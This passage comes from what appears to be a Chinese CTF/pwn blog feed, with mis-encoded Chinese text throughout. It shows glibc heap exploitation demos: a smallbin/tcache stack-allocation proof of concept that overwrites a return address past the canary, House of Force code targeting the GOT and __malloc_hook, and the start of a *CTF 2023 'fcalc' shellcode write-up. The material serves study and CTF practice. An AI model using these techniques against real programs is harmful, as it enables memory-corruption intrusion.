class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char *p4 &#x3D; malloc(0x100);ç”±äºåœ¨void *p3 &#x3D; malloc(0x100);ä¼šæŠŠsmallbiné‡Œçš„å‰ä¸ƒä¸ªchunkä»å¤´æ‹¿åˆ°tcacheé‡Œï¼Œæ‰€ä»¥åˆ°è¾¾tcacheçš„é¡ºåºå’Œåœ¨smallbiné‡Œçš„é¡ºåºæ˜¯ç›¸åçš„</p><p>æ‰€ä»¥p4 ç”³è¯·åˆ°çš„æ˜¯&amp;fake_freelist[4]çš„ä½ç½®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at <span class="number">0x55641a70e2a0</span></span><br><span class="line">Allocating dummy chunks <span class="keyword">for</span> using up tcache later</span><br><span class="line">stack_buffer_1 at <span class="number">0x7ffed8b0f770</span></span><br><span class="line">stack_buffer_2 at <span class="number">0x7ffed8b0f790</span></span><br><span class="line">Create a fake <span class="built_in">free</span>-<span class="built_in">list</span> on the <span class="built_in">stack</span></span><br><span class="line">fake <span class="built_in">free</span>-<span class="built_in">list</span> at <span class="number">0x7ffed8b0f7f0</span></span><br><span class="line">Create a fake chunk on the <span class="built_in">stack</span></span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last <span class="built_in">malloc</span>, which putting <span class="built_in">stack</span> address on smallbin <span class="built_in">list</span></span><br><span class="line">Set the bk pointer to stack_buffer_2 and <span class="built_in">set</span> the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last <span class="built_in">malloc</span>, which returning pointer to the fake chunk on stackSet the bck pointer of stack_buffer_2 to the fake <span class="built_in">free</span>-<span class="built_in">list</span> in order to prevent crash prevent crash introduced by smallbin-to-tcache mechanism</span><br><span class="line">Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">Allocated the large chunk on the heap at 0x55641a70eb20</span><br><span class="line">Freeing dummy chunk</span><br><span class="line">Freeing the chunk 0x55641a70e2a0, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header <span class="title function_">address</span> <span class="params">(libc addresses)</span></span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ebe0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ebe0</span><br><span class="line"></span><br><span class="line">Now performing a <span class="built_in">malloc</span> that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x55641a70e2a0 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x55641a70ef10</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7fcfdf28ece0</span><br><span class="line">victim-&gt;bk: 0x7fcfdf28ece0</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now take all dummies chunk in tcache out</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should <span class="keyword">return</span> the overwritten victim chunk and <span class="built_in">set</span> the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last <span class="built_in">malloc</span> should trick the glibc <span class="built_in">malloc</span> to <span class="keyword">return</span> a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last <span class="built_in">malloc</span> to <span class="number">0x7ffed8b0f780</span></span><br><span class="line"></span><br><span class="line">p4 is <span class="number">0x7ffed8b0f880</span> and should be on the <span class="built_in">stack</span>!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Force</title>
      <link href="/2023/08/02/house-of-force/"/>
      <url>/2023/08/02/house-of-force/</url>
      
        <content type="html"><![CDATA[<p>ä¼¼ä¹åªèƒ½åœ¨2.23å’Œ2.27ä¸ŠæˆåŠŸ</p><p>åˆ©ç”¨æ–¹æ³•å°±æ˜¯æ§åˆ¶topchunksizeä¸ºä¸€ä¸ªå¾ˆå¤§çš„å€¼ï¼Œä¸€èˆ¬ä¸º-1ï¼Œç”³è¯·ä¸€ä¸ªå †ä½¿topchunkæŒ‡å‘ç›®æ ‡åœ°å€ï¼Œä¸‹ä¸€æ¬¡å°±å¯ä»¥ç”³è¯·å‡ºæ¥ç›®æ ‡åœ°å€</p><p>ä¸‹é¢éƒ½æŒ‰ç…§64ä½æ¥åˆ†æï¼Œå…¶ä½™biné‡Œæ²¡æœ‰chunkæ˜¯ä¼šä»topchunkåˆ‡å‰²</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br><span class="line">victim = av-&gt;top;<span class="comment">//è·å–å½“å‰top chunkçš„åœ°å€</span></span><br><span class="line">size   = chunksize(victim);<span class="comment">//top chunkçš„å¤§å°</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))<span class="comment">//nbæ˜¯ç”³è¯·çš„å¤§å°+chunkhead 0x10ï¼ŒMINSIZEå°±æ˜¯å †å—çš„æœ€å°sizeï¼Œ32ä½ç¨‹åºä¸º0x10ï¼Œ64ä½ç¨‹åºä¸º0x20</span></span><br><span class="line">&#123;                                                             <span class="comment">//ä¸»è¦æ˜¯ä¸ºäº†topchunkåˆ‡å‰²åå‰©ä½™å¯ä»¥å¤Ÿå®Œæ•´ä¸€ä¸ªå †å—</span></span><br><span class="line">    remainder_size = size - nb;<span class="comment">//åˆ‡å‰²åçš„topchunkå¤§å°</span></span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);<span class="comment">//</span></span><br><span class="line">    av-&gt;top        = remainder;<span class="comment">//æ›´æ–°top chunkæŒ‡é’ˆï¼Œä¸‹æ¬¡ç”³è¯·çš„ä½ç½®</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);<span class="comment">//åˆ‡å‰²åçš„top chunkè®¾ç½®æ–°çš„sizeï¼Œè¿™å¥ä¼šæ”¹å†™ç›®æ ‡åœ°å€ä¸Šé¢çš„å€¼</span></span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬è¦è®¡ç®—ç¬¬ä¸€æ¬¡mallocçš„å¤§å°malloc_sizeä»è€Œä½¿topchunkæŒ‡å‘ç›®æ ‡åœ°å€target-0x10ï¼Œå› ä¸ºä¼šæœ‰ä¸ªchunkheadå˜›</p><p>target-0x10&#x3D;remainder&#x3D;chunk_at_offset(victim, nb)&#x3D;victim+nb&#x3D;victim+mallocsize+0x10</p><p><strong>æ‰€ä»¥mallocsize&#x3D;target-0x20-victim</strong></p><p>void *__libc_malloc(size_t bytes) mallocsizeä¼šå˜ä¸ºæ— ç¬¦å·ï¼Œä¼šç»è¿‡ä¸‹é¢çš„checked_request2sizeå‡½æ•°å¤„ç†è¿”å›çœŸæ­£ç”³è¯·çš„size</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \reqæ˜¯æˆ‘ä»¬mallocå‚æ•°çš„sizeï¼Œszæ˜¯ç»è¿‡å¤„ç†åçš„size</span></span><br><span class="line">(&#123;                    \</span><br><span class="line">  (sz) = request2size (req);        \</span><br><span class="line">  <span class="keyword">if</span> (((sz) &lt; (req))            \</span><br><span class="line">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="line">    &#123;                    \</span><br><span class="line">      __set_errno (ENOMEM);        \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;                \</span><br><span class="line">    &#125;                    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=                              \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                             \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>REQUEST_OUT_OF_RANGEè¦æ±‚mallocå¤§å°ä¸å¾—å¤§äº-2 * MINSIZEï¼Œä¸€èˆ¬æ»¡è¶³</p><p>request2sizeè¦æ±‚((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)&gt;&#x3D;req,åŸºæœ¬ä¸Šéƒ½æ»¡è¶³ï¼Œä½†æ˜¯ä¼šå½±å“æˆ‘ä»¬çš„ç”³è¯·å¤§å°ï¼Œè¿™å°±éœ€è¦req+SIZE_SZæœ€åå››ä¸ªbitä¸º0ï¼Œä¹Ÿå°±æ˜¯reqåé¢å°½é‡ä¸º0x8æ‰ä¼šä¸æ”¹å˜å¤§å°</p><h2 id="Wikiä¾‹å­"><a href="#Wikiä¾‹å­" class="headerlink" title="Wikiä¾‹å­"></a>Wikiä¾‹å­</h2><h3 id="æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹topchunkä¸Šé¢çš„å†…å®¹"><a href="#æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹topchunkä¸Šé¢çš„å†…å®¹" class="headerlink" title="æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹topchunkä¸Šé¢çš„å†…å®¹"></a>æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹topchunkä¸Šé¢çš„å†…å®¹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== è¿™é‡ŒæŠŠtop chunkçš„sizeåŸŸæ”¹ä¸º0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== å‡å°top chunkæŒ‡é’ˆ</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== åˆ†é…å—å®ç°ä»»æ„åœ°å€å†™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">/mnt/hgfs/share/how2heap/glibc_2<span class="number">.23</span>/a.out:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000600f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000601018</span> R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="number">0000000000601020</span> R_X86_64_JUMP_SLOT  <span class="built_in">malloc</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç€é‡è¯´ä¸‹-4120ï¼ŒåŸæœ¬è¦ç”³è¯·çš„sizeä¸ºmallocsize&#x3D;target-0x20-victim&#x3D;0x00000000601020-0x20-0x602020&#x3D;FFFFFFFFFFFFEFE0&#x3D;-4128</p><p>ä½†æ˜¯ä¸æ»¡è¶³reqåé¢å°½é‡ä¸º0x8çš„æ¡ä»¶ï¼Œæ‰€ä»¥åŠ äº†8å˜ä¸ºFFFFFFFFFFFFEFE8&#x3D;-4120</p><p> malloc(-4120);åä¸‹ä¸€æ¬¡å°±å¯ä»¥ç”³è¯·got</p><p><img src="/2023/08/02/house-of-force/image-20230803143306102.png" alt="image-20230803143306102"></p><p>gotä¸Šé¢çš„å€¼ä¼šè¢«æ”¹å†™ä¸ºå¤§å°</p><p><img src="/2023/08/02/house-of-force/image-20230803143531195.png" alt="image-20230803143531195"></p><h3 id="æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹topchunkä¸‹é¢çš„å†…å®¹"><a href="#æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹topchunkä¸‹é¢çš„å†…å®¹" class="headerlink" title="æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹topchunkä¸‹é¢çš„å†…å®¹"></a>æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹topchunkä¸‹é¢çš„å†…å®¹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== ä¿®æ”¹top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== å¢å¤§top chunkæŒ‡é’ˆ</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_hook</span><br><span class="line">$<span class="number">1</span> = (<span class="type">void</span> *(**)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)) <span class="number">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;</span><br></pre></td></tr></table></figure><p>140737345551056æ˜¯ä»mallocsize&#x3D;target-0x20-victim&#x3D;0x7ffff7dd1b10-0x20-0x602020</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 *ctf pwn</title>
      <link href="/2023/08/02/startctf/"/>
      <url>/2023/08/02/startctf/</url>
      
        <content type="html"><![CDATA[<p>å¸ˆå‚…ä»¬tqlï¼Œé¢˜è§£å‡ºçš„å¤ªå¿«äº†ï¼Œorz</p><p><a href="https://github.com/sixstars/starctf2023/tree/main">https://github.com/sixstars/starctf2023/tree/main</a></p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/s/fcalc&gt; checksec ./fcalc</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/startctf/fcalc/fcalc&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªæº¢å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯åœ¨è¿ç®—ç¬¦å·ä¸º0æ—¶ä¼šæº¢å‡ºåŸæ¥å®šä¹‰çš„å‡½æ•°æ•°ç»„ä¼šè·³è½¬åˆ°0040E0å¤„çš„æ•°æ®æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF </span></span><br><span class="line">s = v6;  </span><br><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>40E0å¤„å­˜çš„ä¸€ä¸ªæ ˆåœ°å€ï¼Œæ ˆä¸Šæ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºå¾€æ ˆä¸Šå†™shellcodeï¼ŒshellcodeæŒ‰åŒç²¾åº¦æµ®ç‚¹æ•°è§£é‡Šéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line"><span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/02/startctf/image-20230802164253679.png" alt="image-20230802164253679"></p><p>æµ®ç‚¹æ•°é‡Œæœ‰expé˜¶ç å…¨ä¸º1ï¼Œæœ‰æ•ˆæ•°<strong>ä¸å…¨ä¸º0</strong>ï¼Œè¡¨ç¤ºNan(not a number)</p><p>å¯¹äºnançš„ä¸€äº›ç‰¹æ€§ <strong>xï¼šincluding NaN and Â±âˆ</strong></p><table><thead><tr><th>Comparison</th><th>NaN â‰¥ <em>x</em></th><th>NaN â‰¤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN â‰  <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><p>æ‰€ä»¥åªè¦æµ®ç‚¹æ•°çš„é«˜ä½ä¸º0x7ffæˆ–0xfffå³å¯</p><p>æµ®ç‚¹æ•°çš„ä½ä½å†åˆ©ç”¨è·³è½¬æŒ‡ä»¤è·³è½¬åˆ°shellcodeå³å¯ï¼Œå¤§æ¦‚æ‰¾åˆ°ä¸‹é¢å¯ä»¥ç”¨çš„è·³è½¬æŒ‡ä»¤</p><p><img src="/2023/08/02/startctf/image-20230802163426648.png" alt="image-20230802163426648"></p><p><img src="/2023/08/02/startctf/image-20230802155245832.png" alt="image-20230802155245832"></p><p><img src="/2023/08/02/startctf/image-20230802165152552.png" alt="image-20230802165152552"></p><p>è®¡ç®—åç§» </p><p><img src="/2023/08/02/startctf/image-20230802170108947.png" alt="image-20230802170108947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+2)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0xffffffffffffffb6</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+5)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0xffffffffffffffb3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span 